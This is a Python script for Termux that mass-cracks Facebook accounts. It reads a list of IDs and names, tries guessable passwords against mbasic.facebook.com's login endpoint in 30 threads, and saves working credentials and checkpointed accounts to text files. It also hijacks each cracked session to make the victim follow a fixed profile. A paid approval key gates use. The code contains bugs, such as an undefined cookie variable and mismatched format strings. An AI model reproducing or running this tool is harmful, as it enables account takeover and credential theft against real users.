#!/usr/bin/python3
import os
try:
    import requests
except ImportError:
    print('\n [✓] installing requests !...\n')
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    print('\n [✓] installing futures !...\n')
    os.system('pip install futures')

try:
    import bs4
except ImportError:
    print('\n [✓] installing bs4 !...\n')
    os.system('pip install bs4')

import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib
from concurrent.futures import ThreadPoolExecutor as diazhealth
from datetime import datetime
from bs4 import BeautifulSoup


ct = datetime.now()
n = ct.month
bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
P = '\x1b[1;97m' # 
M = '\033[1;31m' # 
H = '\033[1;32m' # 
K = '\x1b[1;97m' # 
B = '\x1b[1;97m' # 
U = '\x1b[1;97m' # 
O = '\x1b[1;97m' # 
N = '\x1b[0m'    # 
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
data,data2={},{}
aman,cp,salah=0,0,0
ubahP,fuck,pwBaru=[],[],[]
ok = []
cp = []
id = []
user = []
loop = 0
url_lookup = "https://lookup-id.com/"
url_mb = "https://mbasic.facebook.com"
url_ip = "https://www.httpbin.org/ip"
header_grup = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36 Edg/100.0.1185.29;]"}
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
done = False

def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)

def main_apv():
    imt="=EVIL="
    ak="=HAMII="
    os.system('clear')
    print(logo)
    try:
        key1=open('/data/data/com.termux/files/usr/bin/.mlk-cov', 'r').read()
    except IOError:
        os.system("clear")
        print(logo)
        print (' \x1b[1;91m[\x1b[1;93m•\x1b[1;91m]\x1b[1;93m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●')
        print ("  YOUR TOKEN IS NOT APPROVED")
        print (' \x1b[1;91m[\x1b[1;93m•\x1b[1;91m]\x1b[1;93m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●')
        print ("           THIS IS YOUR KEY BRO")
        print (' \x1b[1;91m[\x1b[1;93m•\x1b[1;91m]\x1b[1;93m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●')
        print ("")
        myid=uuid.uuid4().hex[:10].upper()
        print ("          YOUR KEY : "+ak+myid+imt)
        print (" EASYPESA NUMBER 03463365636 ")
        print (' \x1b[1;91m[\x1b[1;93m•\x1b[1;91m]\x1b[1;93m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●')
        kok=open('/data/data/com.termux/files/usr/bin/.mlk-cov', 'w')
        kok.write(myid+imt)
        kok.close()
        print ("")
        print ("PAID PKR 300")
        print ("     COPY THE KEY AND SEND ME KN WHATSAPP BRO :) ")
        print (' \x1b[1;91m[\x1b[1;93m•\x1b[1;91m]\x1b[1;93m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●')
        time.sleep(3.5)
        tks = 'Hello%20Admin,%20Please%20Confirm%20My%20Key%20To%20Premium✓✓%20% 20% 20%20%20My%20%20Key%20%20:%20'+ak+''+myid+''+imt
        os.system('am start https://wa.me/+994401314689?text=' + tks)
        
    r1=requests.get("https://raw.githubusercontent.com/Hamii-king-06/HAMII-ERROR/main/Approval.txt").text
    if key1 in r1:
        hamii()
    else:
        os.system("clear")
        print(logo)
        print (' \x1b[1;91m[\x1b[1;93m•\x1b[1;91m]\x1b[1;93m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●')
        print ("  YOUR TOKEN IS NOT APPROVED")
        print (' \x1b[1;91m[\x1b[1;93m•\x1b[1;91m]\x1b[1;93m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●')
        print ("          THIS IS YOUR KEY BRO")
        print (' \x1b[1;91m[\x1b[1;93m•\x1b[1;91m]\x1b[1;93m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●')
        print ("          YOUR KEY : "+ak+key1)
        print (" EASYPESA NUMBER 03463365636 ")
        print (' \x1b[1;91m[\x1b[1;93m•\x1b[1;91m]\x1b[1;93m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●')
        print (" PAID PKR 300 ")
        print ("     COPY THE KEY AND SEND ME KN WHATSAPP BRO :) ")
        print (' \x1b[1;91m[\x1b[1;93m•\x1b[1;91m]\x1b[1;93m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●')
        time.sleep(3.5)
        tks = 'Hello%20Admin,%20Please%20Confirm%20My%20Key%20To%20Premium✓✓%20%20%20%20%20My%20%20Key%20%20:%20'+ak+''+key1
        os.system('am start https://wa.me/+994401314689?text=' + tks)
        


logo =                                          """   
\033[1;31mO))     O))      O)       O))       O) )O) )O))
\033[1;91mO))     O))     O) ))     O) O))   O)) )O) )O))
\033[1;92mO))     O))    O)  O))    O)) O)) O O) )O) )O))
\033[1;93mO)))))) O))   O))   O))   O))  O))  O) )O) )O))
\033[1;94mO))     O))  O)))))) O))  O))   O)  O) )O) )O))
\033[1;95mO))     O)) O))       O)) O))       O) )O) )O))
\033[1;96mO))     O))O))         O))O))       O) )O) )O))
\033[1;97m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
   
\033[1;93m ⌦ AUTHOR      : HAMID  MEER [ HAMII ]
\033[1;93m ⌦ BEST FRIEND : AFNAN SHAH  [ XYED  ]
\033[1;93m ⌦ BEST FRIEND : ABDUL WAHAB [ SHONA ]
\033[1;94m ⌦ WHATSAPP    : BANNED HO GIA JAWN 😪
\033[1;95m ⌦ FACEBOOK    : MUHAMMAD HAMID KHAWAJA
\033[1;95m ⌦ YOUTUBE     : HAMII WORLD
\033[1;97m ⌦ VERSION     : 0.0.3
\033[1;36m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬● """                                              
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mH4M11_OK.txt' % (H, P, str(len(ok))))
	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mH4M11_CP.txt' % (H, P, str(len(cp))))
	    input("\x1b[1;97mP R E S S  T O   B A C K ")
	    hamii()

def hamii():
    os.system('clear')
    print(logo)
    ipm = requests.get(url_ip).json()
    todz = ''
    IP = ipm['origin']
    
    print(' [1] START FILE CLONING \x1b[1;91m[ NO LOGIN ]')
    print(' \x1b[1;96m[2] PUBLIC CLONE        \x1b[1;91m [ LOGIN ] ')
    print(' \x1b[1;96m[3] UNLIMITED FILE MAKING')
    print(' [4] FACEBOOK GROUP')
    print(' [F] FACEBOOK ID ')
    print(' [Y] YOUTUBE CHANNEL ')
    print(' [W] WHATSAPP ')
    print(' [E] EXIT ')
    print('')
    _hamii___ = input(' [✓] C H O O S E : ')
    if _hamii___ in ('1', '01'):
        __xxx__().hamiix(id)
    if _hamii___ in ('2','02'):
        os.system('python3 HAMII.py')
    if _hamii___ in ('3','03'):
        os.system('python3 Unlimited-Dump.py')
    if _hamii___ in ('4','04'):
        os.system('xdg-open https://facebook.com/groups/492909121746564/')
    if _hamii___ in ('W', 'w'):
        os.system('xdg-open https://wa.me/+994401314689')
    if _hamii___ in ('F','f'):
        os.system('xdg-open https://www.facebook.com/H4M11.YOUR.DAD')
    if _hamii___ in ('Y', 'y'):
        os.system('xdg-open https://youtube.com/c/Hamiiworld')

    if _hamii___ in ('E', 'e'):
        pass


class __xxx__:
    def __init__(self):
        self.id = []
    def hamiix(self,id):
  
       
      
         
            

        os.system("clear")
        print(logo)
        self.cnt = input('F I L E   P A T H : ')
        self.id = open(self.cnt).read().splitlines()
        os.system('clear')
        print(logo)
        print("")
        ___worldwide___ = ('y')
        if ___worldwide___ in ('yes','Yes','Y', 'y'):
            self.__pler__()
        else:
            print(' [✓] Choose Correct One');
            self.hamiix(id)
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;96m[ H A M I I] {loop}|{len(self.id)} [OK][{len(ok)}] [CP][{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                session=requests.Session()
                header = {
                    "Host":cebok,
                    "upgrade-insecure-requests":"1",
                    "user-agent":"NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+",
                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "dnt":"1",
                    "x-requested-with":"mark.via.gp",
                    "sec-fetch-site":"same-origin",
                    "sec-fetch-mode":"cors",
                    "sec-fetch-user":"empty",
                    "sec-fetch-dest":"document",
                    "referer":"https://m.facebook.com/",
                    "accept-encoding":"gzip, deflate br",
                    "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
                }
                r = session.get(f"https://{cebok}/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F", headers=header)
                das = {
                    "lsd":re.search('name="lsd" value="(.*?)"', str(r.text)).group(1),
                    "jazoest":re.search('name="jazoest" value="(.*?)"', str(r.text)).group(1),
                    "uid":user,
                    "flow":"login_no_pin",
                    "pass":pw,
                    "next":"https://developers.facebook.com/tools/debug/accesstoken/"
                }
                header1 = {
                    "Host":cebok,
                    "cache-control":"max-age=0",
                    "upgrade-insecure-requests":"1",
                    "origin":"https://"+cebok,
                    "content-type":"application/x-www-form-urlencoded",
                    "user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36",
                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "x-requested-with":"XMLHttpRequest",
                    "sec-fetch-site":"same-origin",
                    "sec-fetch-mode":"cors",
                    "sec-fetch-user":"empty",
                    "sec-fetch-dest":"document",
                    "referer":"https://"+cebok+"/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F",
                    "accept-encoding":"gzip, deflate br",
                    "accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
                }
                po = session.post(f"https://{cebok}/login/device-based/validate-password/?shbl=0", data = das, headers = header1, allow_redirects = False)
                if 'c_user' in session.cookies.get_dict():
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    print(f"\r{H} ╚══[HAMII-SUCCESSFUL] {user} | {pw}")
					
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    cek_apk(kuki)
                    open('HAMII_OK.txt' , 'a').write('%s\n' % wrt)
                    self.follow(session,coki)
					
                    break
                elif 'checkpoint' in session.cookies.get_dict():
                    try:
                        tokenz = open('.token.txt').read()
                        cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']
                        month, day, year = cp_ttl.split('/')
                        month = bulan_ttl[month]
                        print('\r%s ╚══[HAMII-CHECKPOINT] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('HAMII_CP.txt' , 'a').write('%s\n' % wrt)
                        break
                    except (KeyError, IOError):
                        month = ''
                        day   = ''
                        year  = ''
                    except:
                        pass
                    print('\r%s ╚══[HAMII-CHECKPOINT] %s | %s ' % (M, user, pw))
                    wrt = '%s|%s' % (user,pw)
                    cp.append(wrt)
                    open('HAMII_CP.txt' , 'a').write('%s\n' % wrt)
                    break
                else:
                    continue
            loop+=1
        except:
            self.__metode__(user, pw, cebok)

    def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100007607054845', cookies={'cookie': coki}).text, 'html.parser')
        get = r.find('a', string='Ikuti').get('href')
        session.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text

    def __pler__(self):
        print('[1] A U T O  [ P A S S ] ')
        print('[2] C R A C K  WITH  NAME AND DIGIT PASS')
        chi = input('\n [✓] C H O O S E: ')
        if chi == '':
            print('\nB S D K  SAHI  SELECT KR')
            self.__pler__()
        elif chi in ('1', '01'):
            os.system("clear")
            print(logo)
            print("\033[1;36m\r        N O   N E E D  O F   V P N 😈\033[1;37m")
            print(47*"-")
            print('\033[1;36m T O T A L  I D Z : [ %s ] ' % len(self.id))
            print (' ')
            print('\033[1;36m C R A C K I N G  S T A R T...')
            print (' ')
            print('\033[1;36m IT,X  H A M I I  H E R E...')
            print(47*"-")
            with diazhealth(max_workers=30) as healthworld:
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                            pwx = ["786786"]
                            pwx = ["Pakistan"]
                            pwx = ["bismillah"]
                            pwx = ["123456"]
                        healthworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
        elif chi in ('2', '02'):
            os.system("clear")
            print(logo)
            print("\033[1;37m\rEnter Last Name Digits\033[1;37m\n")
            p1 = input('  Name + 1 : ')
            p2 = input('  Name + 2 : ')
            p3 = input('  Name + 3 : ')
            p4 = input('  Name + 4 : ')
            os.system("clear")
            print(logo)
            print("\033[1;36m\r        N O   N E E D  O F   V P N 😈\033[1;37m")
            print(47*"-")
            print('\033[1;36m T O T A L  I D Z : [ %s ] ' % len(self.id))
            print (' ')
            print('\033[1;36m C R A C K I N G  S T A R T...')
            print (' ')
            print('\033[1;36m IT,X  H A M I I  H E R E...')
            print(47*"-")
            with diazhealth(max_workers=30) as healthworld:
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                        healthworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
        else:
            print('\n Select Valid One')
            self.__pler__()

# CEK APLICATIONS
def cek_apk(kuki):
	session = requests.Session()
	w=session.get("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\n  %s%s. %s%s"%(P,i+1,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
	except AttributeError:
		print ("\n%s• cookie invalid"%(M))
	w=session.get("https://m.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\n   %s%s. %s%s"%(P,i+1,M,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:
		print ("\n%s• cookie invalid"%(M))



class load:
    def __init__(self):
        _ = ''
        __ = int('30')
        ___ = int('0')
        __ -= 1
        ___ += 1
        for t in range(int("1")):
            print('\r Please Wait ....')
            sys.stdout.flush()
            time.sleep(0.1)
        print('\n')

main_apv()
